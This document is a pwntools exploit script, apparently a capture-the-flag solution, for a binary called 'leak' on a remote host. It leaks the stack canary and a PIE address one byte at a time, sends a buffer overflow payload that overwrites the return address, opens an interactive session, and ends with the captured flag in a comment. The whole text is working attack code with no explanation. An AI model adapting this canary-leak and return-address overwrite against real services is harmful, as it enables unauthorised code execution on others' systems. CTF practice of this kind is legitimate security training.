from pwn import *

local = 0
debug = 0

if local:
	s = process('./leak')	
	if debug:
		debug = gdb.attach(s, gdbscript='''
			brva 0xE4C
			c
		''')
	else:	
		raw_input('DEBUG')
else:
	s = remote('45.122.249.68', 10004)

binary = ELF('leak')

canary = 0

for i in range(0, 8, 2):
	s.sendlineafter(b'2: bof\n', b'1')
	s.sendlineafter(b'vi tri: ', bytes(str(16 + i), 'utf-8'))
	s.recvuntil(b'Gia tri cho ban: ')
	canary |= (s.recv(1)[0] << (8 * i))
	s.sendlineafter(b'vi tri: ', bytes(str(17 + i), 'utf-8'))
	s.recvuntil(b'Gia tri cho ban: ')
	canary |= (s.recv(1)[0] << (8 * (i + 1)))
	s.sendlineafter(b'Nhap so tien ban da di lam tu thien: ', b'0')	

log.info('canary: 0x%x', canary)

leak_PIE = 0

for i in range(0, 8, 2):
	s.sendlineafter(b'2: bof\n', b'1')
	s.sendlineafter(b'vi tri: ', bytes(str(32 + i), 'utf-8'))
	s.recvuntil(b'Gia tri cho ban: ')
	leak_PIE |= (s.recv(1)[0] << (8 * i))
	s.sendlineafter(b'vi tri: ', bytes(str(33 + i), 'utf-8'))
	s.recvuntil(b'Gia tri cho ban: ')
	leak_PIE |= (s.recv(1)[0] << (8 * (i + 1)))
	s.sendlineafter(b'Nhap so tien ban da di lam tu thien: ', b'0')	

log.info('leak PIE: 0x%x', leak_PIE)

s.sendlineafter(b'2: bof\n', b'2')

payload = b'A' * 0x88 + p64(canary) + p64(0) + p64(leak_PIE - 0xEE3 + 0xE5D) + p64(leak_PIE - 0xEE3 + 0xBCA)

s.sendlineafter(b'Viet Nam se chien thang dai dich!!!\n', payload)

s.interactive()
#flag{su_that_khong_som_thi_chieu_khong_mai_thi_mot_cung_loi_ra}
